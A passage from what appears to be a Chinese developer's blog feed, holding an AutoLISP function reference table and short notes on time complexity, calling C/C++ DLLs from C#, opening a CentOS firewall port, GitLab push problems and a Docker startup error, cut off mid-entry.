角度)</code></td><td>角度的正弦值</td><td>角度值为弧度</td></tr><tr><td><code>(sqrt 数值)</code></td><td>数值的平方根</td><td>平方根为非负</td></tr></tbody></table><p>AutoLisp 语言支持的三角函数只有两个：正弦和余弦；支持的反三角函数只有一个：反正切。（不知道对不对，我暂时没发现别的。）</p><hr><h2 id="2-检验与逻辑函数"><a href="#2-检验与逻辑函数" class="headerlink" title="2. 检验与逻辑函数"></a>2. 检验与逻辑函数</h2><table><thead><tr><th>函数</th><th>返回值</th><th>备注</th></tr></thead><tbody><tr><td><code>(= 表达式1 表达式2 ...)</code></td><td>比较表达式是否全部都相同，适用数值及字符串</td><td>-</td></tr><tr><td><code>(／= 表达式1 表达式2 ...)</code></td><td>比较表达式是否全部都不同</td><td>-</td></tr><tr><td><code>(＜ 表达式1 表达式2 ...)</code></td><td>比较表达式是否严格递增</td><td>-</td></tr><tr><td><code>(＜= 表达式1 表达式2 ...)</code></td><td>比较表达式是否递不减</td><td>-</td></tr><tr><td><code>(＞ 表达式1 表达式2 ...)</code></td><td>比较表达式是否严格递减</td><td>-</td></tr><tr><td><code>(＞= 表达式1 表达式2 ...)</code></td><td>比较表达式是否递不增</td><td>-</td></tr><tr><td><code>(~ 数值)</code></td><td>数值的位 not 值</td><td>1 的补码</td></tr><tr><td><code>(and 表达式1 表达式2…)</code></td><td>逻辑 and 的结果</td><td>-</td></tr><tr><td><code>(boole 函数 整数 整数…)</code></td><td>位式布尔运算</td><td>-</td></tr><tr><td><code>(eq 表达式1 表达式2)</code></td><td>比较表达式 1 与表达式 2 是否相同，适用列表比较</td><td>-</td></tr><tr><td><code>(equal 表达式1 表达式2 [差量])</code></td><td>比较表达式 1 与表达式 2 是否相同，差量可省略</td><td>-</td></tr></tbody></table><p>对于检验函数，若表达式为真，则返回<code>T</code>；反之，则返回<code>nil</code>。</p><hr><h2 id="3-转换运算函数"><a href="#3-转换运算函数" class="headerlink" title="3.转换运算函数"></a>3.转换运算函数</h2><table><thead><tr><th>函数</th><th>返回值</th><th>备注</th></tr></thead><tbody><tr><td><code>(angtof 字符串 [模式])</code></td><td>角度值的字符串转成实数</td><td>返回弧度值</td></tr><tr><td><code>(angtos 角度 [模式] [精度] )</code></td><td>角度转成的字符串值</td><td>-</td></tr><tr><td><code>(atof 字符串)</code></td><td>字符串转成实数值</td><td>-</td></tr><tr><td><code>(atoi 字符串)</code></td><td>字符串转成整数值</td><td>忽略小数位</td></tr><tr><td><code>(cvunit 数值原始单位 转换单位)</code></td><td>数值换算单位后的值</td><td>转换根据 acad.unt 文件</td></tr><tr><td><code>(distof 字符串 [模式])</code></td><td>根据模式将字符串转成实数值</td><td>-</td></tr><tr><td><code>(itoa 整数)</code></td><td>整数转成字符串</td><td>-</td></tr><tr><td><code>(rtos 数值模式 [精度])</code></td><td>实数转成字符串</td><td>-</td></tr><tr><td><code>(trans 点 原位置 新位置 [位移])</code></td><td>转换坐标系统值</td><td>-</td></tr></tbody></table><hr><h2 id="4-表处理函数"><a href="#4-表处理函数" class="headerlink" title="4.表处理函数"></a>4.表处理函数</h2><table><thead><tr><th>函数</th><th>返回值</th><th>备注</th></tr></thead><tbody><tr><td><code>(append 表1 表2 ...)</code></td><td>结合所有表成一个表</td><td>-</td></tr><tr><td><code>(assoc 关键元素 联合表)</code></td><td>根据关键元素找寻联合表中关系信息</td><td>-</td></tr><tr><td><code>(car 表)</code></td><td>表中的第一个元素，通常用来求 X 坐标</td><td>-</td></tr><tr><td><code>(cadr 表)</code></td><td>表中的第二个元素，通常用来求 y 坐标</td><td>-</td></tr><tr><td><code>(caddr 表)</code></td><td>表中的第三个元素，通常用来求 Z 坐标</td><td>-</td></tr><tr><td><code>(cdr 表)</code></td><td>除去第一个元素后的表</td><td>-</td></tr><tr><td><code>(cons 新元素 表)</code></td><td>将新元素添加到表</td><td>-</td></tr><tr><td><code>(foreach 名称 表 表达式)</code></td><td>将表的每一元素对应至名称再根据表达式执行响应</td><td>-</td></tr><tr><td><code>(length 表)</code></td><td>表内的元素数量</td><td>-</td></tr><tr><td><code>(list 元素 元素 ...)</code></td><td>将所有元素合并为一表</td><td>-</td></tr><tr><td><code>(listp 元素)</code></td><td>判断元素是否为一串</td><td>-</td></tr><tr><td><code>(mapcar 函数 表1 表2 …)</code></td><td>将表 1、表 2 表的元素配合函数，求得新表</td><td>-</td></tr><tr><td><code>(member 关键元素 表)</code></td><td>关键元素(含)以后的表</td><td>-</td></tr><tr><td><code>(nth n 表)</code></td><td>表的第 n 个元素</td><td>-</td></tr><tr><td><code>(reverse 表)</code></td><td>将表元素根据顺序颠倒过来的表</td><td>-</td></tr><tr><td><code>(subst 新项 旧项 表)</code></td><td>替换新旧表后的表</td><td>-</td></tr></tbody></table><hr><h2 id="5-字符串、字符、文件处理函数"><a href="#5-字符串、字符、文件处理函数" class="headerlink" title="5.字符串、字符、文件处理函数"></a>5.字符串、字符、文件处理函数</h2><table><thead><tr><th>函数</th><th>返回值</th><th>备注</th></tr></thead><tbody><tr><td><code>(ascii 字符串)</code></td><td>字符串第一个字符的 ASCII 码</td><td>-</td></tr><tr><td><code>(chr 整数)</code></td><td>整数所对应的 ASCII 单一字符串</td><td>-</td></tr><tr><td><code>(close 文件名称)</code></td><td>关闭文件</td><td>-</td></tr><tr><td><code>(open 文件名 模式)</code></td><td>打开文件代码，准备读取或写入信息</td><td>-</td></tr><tr><td><code>(read 字符串)</code></td><td>列表中的字符串的第一组元素</td><td>-</td></tr><tr><td><code>(read-char [文件路径])</code></td><td>通过键盘或文件中读取单一字符</td><td>-</td></tr><tr><td><code>(read-line [文件路径])</code></td><td>经由键盘或文件中读取一行字符串</td><td>-</td></tr><tr><td><code>(strcase 字符串 [字样])</code></td><td>字符串大小写， [字样]为 T，小写；忽略，大写</td><td>-</td></tr><tr><td><code>(strcat 字符串1 字符串2 …)</code></td><td>将各字符串合并为一个字符串</td><td>-</td></tr><tr><td><code>(strlen 字符串)</code></td><td>字符串构成的字符数(即长度)</td><td>-</td></tr><tr><td><code>(substr 字符串 起始 长度)</code></td><td>取出于字符串</td><td>-</td></tr><tr><td><code>(wcmatch 字符串 格式)</code></td><td>T 或 nil，将字符串与通用字符进行比较</td><td>-</td></tr><tr><td><code>(write-char 数值 [文件路径])</code></td><td>将一 ASCII 字符写到文件或屏幕</td><td>-</td></tr><tr><td><code>(write-line 字符串 [文件路径])</code></td><td>将字符串写到文件或屏幕上</td><td>-</td></tr></tbody></table><h2 id="6-等待输入函数"><a href="#6-等待输入函数" class="headerlink" title="6. 等待输入函数"></a>6. 等待输入函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(getangle [基点] [提示])</code></td><td>请求输入十进制角度数值，响应一个弧度值。提示及参考点可选</td></tr><tr><td><code>(getcorner 基点 [提示])</code></td><td>请求输入另一矩形框对角点坐标</td></tr><tr><td><code>(getdist [基点] [提示])</code></td><td>请求输入一段距离</td></tr><tr><td><code>(getint [提示])</code></td><td>请求输入一个整数值</td></tr><tr><td><code>(getkword [提示] )</code></td><td>请求输入“关键词”</td></tr><tr><td><code>(getorient [基点] [提示])</code></td><td>请求输入十进制角度，响应一弧度值不受 angbase、angdir 影响</td></tr><tr><td><code>(getpoint [基点] [提示])</code></td><td>请求输入一个点的坐标</td></tr><tr><td><code>(getreal [提示])</code></td><td>请求输入一个实数</td></tr><tr><td><code>(getstring [提示])</code></td><td>请求输入一个字符串</td></tr><tr><td><code>(initget [位] 字符串)</code></td><td>设定下次 getxxx 函数的有效输入</td></tr></tbody></table><hr><h2 id="7-几何运算函数"><a href="#7-几何运算函数" class="headerlink" title="7. 几何运算函数"></a>7. 几何运算函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(angle 点1 点2)</code></td><td>取得两点的角度弧度值</td></tr><tr><td><code>(distance 点1 点2)</code></td><td>取得两点的距离</td></tr><tr><td><code>(inters 点1 点2 点3 点4［模式］)</code></td><td>取得两条线的交点</td></tr><tr><td><code>(osnap 点 模式字符串)</code></td><td>按照捕捉模式取得另一坐标点</td></tr><tr><td><code>(polar 基点 弧度 距离)</code></td><td>按照极坐标法取得另一坐标点</td></tr><tr><td><code>(textbox 对象列表)</code></td><td>取得文字对象的两个对角点坐标</td></tr></tbody></table><hr><h2 id="8-对象处理函数"><a href="#8-对象处理函数" class="headerlink" title="8. 对象处理函数"></a>8. 对象处理函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(entdel 对象名称)</code></td><td>删除或取消删除对象</td></tr><tr><td><code>(entget 对象名称［应用程序列表］)</code></td><td>取出对象名称的信息列表</td></tr><tr><td><code>(entlast)</code></td><td>取出图形信息中的最后一个对象</td></tr><tr><td><code>(entmake 对象列表)</code></td><td>建立一个新的对象列表</td></tr><tr><td><code>(entmod 对象列表)</code></td><td>根据更新的信息列表更新屏幕上元体</td></tr><tr><td><code>(entnext [对象名称])</code></td><td>找寻图面中的下一个对象</td></tr><tr><td><code>(entsel [提示])</code></td><td>请求选取一个对象，响应包含对象名称及选点坐标的列表；</td></tr><tr><td><code>(entupd 对象名称)</code></td><td>更新屏幕上复元体图形</td></tr><tr><td><code>(handent 图码)</code></td><td>返回：图码的元体名称</td></tr><tr><td><code>(nentsel [提示])</code></td><td>返回：BLOCK 所含副元体对象信息列表</td></tr><tr><td><code>(nentselp [提示] [点])</code></td><td>返回：BLOCK 所含副元体对象信息（以 4x4 矩形表示）</td></tr></tbody></table><h2 id="9-选择集、符号表处理函数"><a href="#9-选择集、符号表处理函数" class="headerlink" title="9. 选择集、符号表处理函数"></a>9. 选择集、符号表处理函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(ssadd [对象名称] [选择集])</code></td><td>将对象加入选择集或建立一新选择集</td></tr><tr><td><code>(ssdel 对象名称 选择集)</code></td><td>将对象自选择集中移出</td></tr><tr><td><code>(ssget [模式] [点1] [点2])</code></td><td>取得一个选择集</td></tr><tr><td><code>(ssget "X" [过滤列表])</code></td><td>取得根据过滤列表所指定范围的选择集</td></tr><tr><td><code>(sslenth 选择集)</code></td><td>计算选择集的对象个数</td></tr><tr><td><code>(ssmemb 对象名称 选择集)</code></td><td>响应对象名称是否包含于选择集内</td></tr><tr><td><code>(ssname 选择集 索引值)</code></td><td>根据索引值取出选择集中的对象名称</td></tr><tr><td><code>(tblnext 符号表名称 [T])</code></td><td>检视符号表，有效的符号表：<code>"LAYER"</code> <code>"LTYPE"</code> <code>"VIEW"</code> <code>"STYLE"</code> <code>"BLOCK"</code></td></tr><tr><td><code>(tblsearch 符号表名称 符号)</code></td><td>在符号表中搜寻符号</td></tr></tbody></table><hr><h2 id="10-AutoCAD-相关查询、控制函数"><a href="#10-AutoCAD-相关查询、控制函数" class="headerlink" title="10. AutoCAD 相关查询、控制函数"></a>10. AutoCAD 相关查询、控制函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(command "AutoCAD命令" …)</code></td><td>超重量级函数，调用执行 AutoCAD 命令</td></tr><tr><td><code>(findfile 文件名)</code></td><td>返回：该文件名的路径及文件名</td></tr><tr><td><code>(getfiled 标题 内定档名 扩展名 旗号)</code></td><td>通过标准 AutoCAD 文件对话 DCL 对话框获得文件</td></tr><tr><td><code>(getenv "环境变量")</code></td><td>取得该环境变量的设定值，以字符串表示</td></tr><tr><td><code>(getvar "系统变量")</code></td><td>取得该系统变量的设定值，以字符串表示</td></tr><tr><td><code>(setvar "系统变量" "值")</code></td><td>设定该系统变量的值</td></tr><tr><td><code>(regapp 应用类项)</code></td><td>将目前的 AutoCAD 图形登记为一个应用程序名称</td></tr></tbody></table><h2 id="11-判断式、循环相关函数"><a href="#11-判断式、循环相关函数" class="headerlink" title="11. 判断式、循环相关函数"></a>11. 判断式、循环相关函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(if &lt;比较式&gt; &lt;表达式1&gt; [表达式2])</code></td><td>比较式结果为真，执行<code>&lt;表达式1&gt;</code>，否则执行<code>&lt;表达式2&gt;</code></td></tr><tr><td><code>(repeat 次数 &lt;表达式&gt; ...)</code></td><td>重复执行 N 次<code>&lt;表达式&gt; ...</code></td></tr><tr><td><code>(while &lt;比较式&gt; &lt;表达式&gt; ...)</code></td><td>当条件成立则执行表达式内容</td></tr><tr><td><code>(cond &lt;比较式1&gt; &lt;表达式1&gt; &lt;比较式2&gt; &lt;表达式2&gt; ...)</code></td><td>多条件式的 if</td></tr><tr><td><code>(progn &lt;表达式1&gt; ...)</code></td><td>连接其中的表达式为一组，常配合 if、cond 等函数</td></tr></tbody></table><hr><h2 id="12-函数处理、定义、追踪和错误处理函数"><a href="#12-函数处理、定义、追踪和错误处理函数" class="headerlink" title="12. 函数处理、定义、追踪和错误处理函数"></a>12. 函数处理、定义、追踪和错误处理函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(*error* 字符串)</code></td><td>程序错误时的警示信息</td></tr><tr><td><code>(alert 字符串)</code></td><td>以对话框式显示出警告字符串</td></tr><tr><td><code>(apply 功能函数 列表)</code></td><td>将功能函数与列表结合后执行</td></tr><tr><td><code>(defun 名称 自变量列表 表达式)</code></td><td>自定函数或子程序</td></tr><tr><td><code>(eval 表达式)</code></td><td>表达式的执行结果</td></tr><tr><td><code>(exit)</code></td><td>强制退出目前的应用程序</td></tr><tr><td><code>(lambda 自变量 表达式)</code></td><td>定义匿名的函数</td></tr><tr><td><code>(progn 表达式1 表达式2 …)</code></td><td>连接其内的表达式为一组，常用于配合 if、cond 等函数</td></tr><tr><td><code>(quit)</code></td><td>强制退出目前的应用程序</td></tr><tr><td><code>(tablet 代码 [列1 列2 列3 方向])</code></td><td>取用或建立对数字化仪的校调</td></tr><tr><td><code>(trace 函数 …)</code></td><td>对函数设定追踪标记，辅助检错</td></tr><tr><td><code>(untrace 函数 …)</code></td><td>对函数设定解除追踪标记</td></tr></tbody></table><hr><h2 id="13-显示、打印控制函数"><a href="#13-显示、打印控制函数" class="headerlink" title="13. 显示、打印控制函数"></a>13. 显示、打印控制函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(gfaphscr)</code></td><td>作图环境切换到图形画面</td></tr><tr><td><code>(grclear)</code></td><td>暂时清除模前的屏幕画面</td></tr><tr><td><code>(grdraw 起点 终点 颜色 [亮显])</code></td><td>暂时性的画出一条线</td></tr><tr><td><code>(grread [追踪])</code></td><td>由输入设备读取追踪值</td></tr><tr><td><code>(grtext 位置 字符串 [亮显])</code></td><td>将字符串显示在状态列或屏幕菜单上</td></tr><tr><td><code>(grvecs 向量列表 [转置矩阵])</code></td><td>暂时性的画出多条线</td></tr><tr><td><code>(menucmd 字符串)</code></td><td>；提供在 AlltOLISP 中调用各菜单</td></tr><tr><td><code>(prin1 [表达式 [文件代码]])</code></td><td>将表达式打印于命令区或已打开的文件句柄字符则以“\”为前缀展开</td></tr><tr><td><code>(pinc [表达式 [文件代码]])</code></td><td>除句柄字符则不以”＼”为前缀展外开其余同 Prinl</td></tr><tr><td><code>(print [表达式 [文件代码]])</code></td><td>除表达式会往下一新行列出，及空一格外其余同 prinl</td></tr><tr><td><code>(prompt 信息)</code></td><td>将信息显示于屏幕的命令区，并随后响应一个 nil 信息</td></tr><tr><td><code>(redraw [对象名称 [模式]])</code></td><td>重绘整张图或根据对象名称重绘该图形</td></tr><tr><td><code>(terpri)</code></td><td>在屏幕上显示新列</td></tr><tr><td><code>(textscr)</code></td><td>作图环境切换到文字画面</td></tr><tr><td><code>(textpage)</code></td><td>清除文字画面文字类似 DOS 的 cls 命令</td></tr><tr><td><code>(vports)</code></td><td>窗口组态列表</td></tr></tbody></table><hr><h2 id="14-符号、元素、表达式处理函数"><a href="#14-符号、元素、表达式处理函数" class="headerlink" title="14. 符号、元素、表达式处理函数"></a>14. 符号、元素、表达式处理函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(atom 元素)</code></td><td>如果元素不是列表，返回 T，否则为 nil</td></tr><tr><td><code>(atoms-family 格式 [符号号列表])</code></td><td>一组己定义函数的符号列表</td></tr><tr><td><code>(boundp 表达式)</code></td><td>T 或 nil，响应表达式是否有值存在</td></tr><tr><td><code>(minusp 元素)</code></td><td>判定元素是否为负值</td></tr><tr><td><code>(not 元素)</code></td><td>判定元素是否为 nil</td></tr><tr><td><code>(null 元素)</code></td><td>判定元素是否被赋予 nil 值</td></tr><tr><td><code>(numberp 元素)</code></td><td>判定元素是否为整数或实数</td></tr><tr><td><code>(quote 表达式)</code></td><td>响应表达式未检算前状态，同<code>'</code>功能</td></tr><tr><td><code>(set 符号 表达式)</code></td><td>将表达式结果设定给带单引号’符号</td></tr><tr><td><code>(setq 符号1 表达式1 [符号2 表达式2] …)</code></td><td>设定表达式结果给各符号</td></tr><tr><td><code>(type 元素)</code></td><td>元素的信息型态</td></tr><tr><td><code>(zerop 元素)</code></td><td>判定元素是否为 0 值</td></tr></tbody></table><hr><h2 id="15-ADS、ARX、AutoLISP-加载与卸载函数"><a href="#15-ADS、ARX、AutoLISP-加载与卸载函数" class="headerlink" title="15. ADS、ARX、AutoLISP 加载与卸载函数"></a>15. ADS、ARX、AutoLISP 加载与卸载函数</h2><table><thead><tr><th>函数</th><th>返回值</th></tr></thead><tbody><tr><td><code>(ads)</code></td><td>目前加载 ADS 程序列表</td></tr><tr><td><code>(arx)</code></td><td>目前加载 ARX 程序列表</td></tr><tr><td><code>(arxload 应用程序 [出错处理]))</code></td><td>加载 ARX 程序</td></tr><tr><td><code>(arxunload 应用程序 [出错处理]))</code></td><td>卸载 ARX 程序</td></tr><tr><td><code>(ver)</code></td><td>目前 AutoLISP 版本字符串</td></tr><tr><td><code>(load LSP文件名 [加载失败])</code></td><td>加载 AutoLISP 文件(*．lsp)</td></tr><tr><td><code>(xload 应用程序 [错处理])</code></td><td>加载 ADS 应用程序</td></tr><tr><td><code>(xunload 应用程序 [出错处理])</code></td><td>卸载 ADS 应用程序</td></tr></tbody></table><p>作者：吴吉光<br>链接：<a href="https://www.jianshu.com/p/067ea05a425c">https://www.jianshu.com/p/067ea05a425c</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p><p>作者：吴吉光<br>链接：<a href="https://www.jianshu.com/p/57578dc48f11">https://www.jianshu.com/p/57578dc48f11</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p><p>作者：吴吉光<br>链接：<a href="https://www.jianshu.com/p/41fd1a86939a">https://www.jianshu.com/p/41fd1a86939a</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>时间复杂度的计算----摘自百度百科</title>
      <link href="/2019/04/18/yuque/ft6znq/"/>
      <url>/2019/04/18/yuque/ft6znq/</url>
      
        <content type="html"><![CDATA[<p>1.一般情况下，算法中基本操作重复执行的次数是问题规模 n 的某个函数，用 T(n)表示，若有某个辅助函数 f(n)，使得 T(n)/f(n)的极限值（当 n 趋近于无穷大时）为不等于零的常数，则称 f(n)是 T(n)的同数量级函数。记作 T(n)=O(f(n))，称 O(f(n)) 为算法的渐进时间复杂度，简称时间复杂度。<br><strong>分析：</strong>随着模块 n 的增大，算法执行的时间的增长率和 f(n) 的增长率成正比，所以 f(n) 越小，算法的时间复杂度越低，算法的效率越高。</p><hr><ol start="2"><li>在计算时间复杂度的时候，先找出算法的基本操作，然后根据相应的各语句确定它的执行次数，再找出 T(n) 的同<a href="https://baike.baidu.com/item/%E6%95%B0%E9%87%8F%E7%BA%A7">数量级</a><br>（它的同数量级有以下：1，logn，n，n logn ，n 的平方，n 的三次方，2 的 n 次方，n!），<br>找出后，f(n) = 该数量级，若 T(n)/f(n) 求极限可得到一常数 c，则时间复杂度 T(n) = O(f(n))<br>例：算法：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//该步骤属于基本操作执行次数：n的平方次</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span>            c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> b<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//该步骤属于基本操作执行次数：n的三次方次</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>则有 &nbsp;<img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1555562636748-f99ce658-2110-4359-bb49-b931f0f510aa.png#align=left&amp;display=inline&amp;height=20&amp;originHeight=20&amp;originWidth=101&amp;size=0&amp;status=done&amp;width=101">，根据上面括号里的同数量级，我们可以确定 n 的三次方 为 T（n）的同数量级<br>则有 &nbsp;<img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1555562636756-2f4daf5f-01a6-46e9-ab70-8d09a39fd4ee.png#align=left&amp;display=inline&amp;height=20&amp;originHeight=20&amp;originWidth=67&amp;size=0&amp;status=done&amp;width=67">&nbsp;，然后根据 T(n)/f(n) 求极限可得到常数 c<br>则该算法的时间<a href="https://baike.baidu.com/item/%E5%A4%8D%E6%9D%82">复杂</a>度：T(n) = O(n^3) 注：n^3 即是 n 的 3 次方。</p><hr><p>3.在 pascal 中比较容易理解，容易计算的方法是：<br>看看有几重 for 循环，<br>只有一重则时间复杂度为 O(n)，<br>二重则为 O(n^2)，<br>依此类推，<br>如果有二分则为 O(logn)，<br>二分例如<a href="https://baike.baidu.com/item/%E5%BF%AB%E9%80%9F%E5%B9%82">快速幂</a>、二分查找，<br>如果一个 for 循环套一个二分，那么时间复杂度则为 O(nlogn)。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用C#调用自己写的c/c++类库</title>
      <link href="/2019/04/18/yuque/dl0eht/"/>
      <url>/2019/04/18/yuque/dl0eht/</url>
      
        <content type="html"><![CDATA[<h1 id="1-修改-c-c-函数-使其能够被外部调用"><a href="#1-修改-c-c-函数-使其能够被外部调用" class="headerlink" title="1.修改 c/c++函数,使其能够被外部调用"></a>1.修改 c/c++函数,使其能够被外部调用</h1><p>方法: 1.修改函数声明<br>修改前:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改后:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> <span class="token keyword">int</span> __stdcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.修改解决方案下要生成类库项目的类型<br>右键项目—&gt;选择属性 &nbsp; 会出现如下图的属性页</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1555549992989-f32cca49-773c-4c85-ad44-f5b5ddd6debd.png#align=left&amp;display=inline&amp;height=561&amp;name=image.png&amp;originHeight=561&amp;originWidth=876&amp;size=93538&amp;status=done&amp;style=none&amp;width=876" alt="image.png"><br>重新编译一下,就会发现在在输出目录出现一个 &nbsp; 项目名.dll&nbsp; 的文件 .<br><strong>如果不设置 &nbsp; 公共语言运行时支持 &nbsp; 为公共语言运行时支持(/clr)的话,&nbsp; 在 c#中是无法引用的.</strong></p><h1 id="2-在-C-中调用-C-C-编写的-dll"><a href="#2-在-C-中调用-C-C-编写的-dll" class="headerlink" title="2.在 C#中调用 C/C++编写的 dll"></a>2.在 C#中调用 C/C++编写的 dll</h1><p>1.首先编写外部静态方法,然后通过注解 DllImport 指定对应的 dll 中的方法名.<br><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1555550985865-9557d691-eeb1-408c-857d-61e9fca664a0.png#align=left&amp;display=inline&amp;height=208&amp;name=image.png&amp;originHeight=208&amp;originWidth=535&amp;size=20815&amp;status=done&amp;style=none&amp;width=535" alt="image.png"> 2.就可以通过 CUitl.Main(“string”)&nbsp; 的方式进行调用了.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>centos7开放端口步骤</title>
      <link href="/2019/04/04/yuque/eoixay/"/>
      <url>/2019/04/04/yuque/eoixay/</url>
      
        <content type="html"><![CDATA[<p>1.&nbsp;netstat -tlunp&nbsp; 检查当前开放的端口<br>2.firewall-cmd –zone=public –add-port=10020/tcp –permanent 防火墙开放 10020 端口<br>3.firewall-cmd –reload&nbsp; 重启防火墙<br>4.iptables-save 保存网络设置</p><p>5.namp ip&nbsp; 扫描主机的开放端口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gitlab问题汇总</title>
      <link href="/2019/04/04/yuque/dk8yka/"/>
      <url>/2019/04/04/yuque/dk8yka/</url>
      
        <content type="html"><![CDATA[<p>1.vs 设置 git 提交,不能在储存库直接设置,不然没法登陆(如图一).要在推送(删除之前的,点击同步自动跳转过来)中进行设置.</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1554389571184-ba3ddc25-b073-4052-9f6a-7b84b30c60b8.png#align=left&amp;display=inline&amp;height=326&amp;name=image.png&amp;originHeight=537&amp;originWidth=507&amp;size=39503&amp;status=done&amp;width=308" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1554389754375-5c4bfe6a-dd55-4fe8-9207-188f9ecc16af.png#align=left&amp;display=inline&amp;height=266&amp;name=image.png&amp;originHeight=411&amp;originWidth=539&amp;size=35597&amp;status=done&amp;width=349" alt="image.png"> 2.账号密码不对导致提交失败,在电脑系统的凭证管理器修改一下就好了.</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1554389992858-08b438e1-7b78-4212-b81a-4bf58c0697a7.png#align=left&amp;display=inline&amp;height=388&amp;name=image.png&amp;originHeight=460&amp;originWidth=699&amp;size=40990&amp;status=done&amp;width=590" alt="image.png"> 3.杂乱分支导致提交不上,使用 git&nbsp;pull&nbsp;origin&nbsp;master&nbsp;–allow-unrelated-histories 强制合并分支可以解决.</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1554390101014-e47af893-f0e2-4a48-b135-0593175c1335.png#align=left&amp;display=inline&amp;height=432&amp;name=image.png&amp;originHeight=576&amp;originWidth=692&amp;size=66342&amp;status=done&amp;width=519" alt="image.png"><br>4.gitlab 的 master 分支默认只有创建者有权限进行提交和融合,可以在储存库设置中修改权限.</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1554390215759-edc764cc-fe66-47db-a7ad-834cd993c8de.png#align=left&amp;display=inline&amp;height=125&amp;name=image.png&amp;originHeight=243&amp;originWidth=623&amp;size=25496&amp;status=done&amp;width=320" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1554390273656-c2c7aeee-fbc2-488a-bb6b-f1008587d0cb.png#align=left&amp;display=inline&amp;height=121&amp;name=image.png&amp;originHeight=234&amp;originWidth=775&amp;size=13294&amp;status=done&amp;width=400" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解决docker启动失败</title>
      <link href="/2019/04/04/yuque/kqtcrn/"/>
      <url>/2019/04/04/yuque/kqtcrn/</url>
      
        <content type="html"><![CDATA[<p>刚开始安装后，启动一直提示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Job <span class="token keyword">for</span> docker.service failed because the control process exited with error code. See <span class="token string">"systemctl status docker.service"</span> and <span class="token string">"journalctl -xe"</span> <span class="token keyword">for</span> details.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在国内搜索无果，后来在 github 上发现了<a href="https://github.com/docker/for-linux/issues/162">解决方法</a>：</p><p>我是通过 uzzal2k5 大佬的方法解决的，方法如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">我找到了一个解决方案，保留了所有数据和容器，可以帮助您我的问题是“ 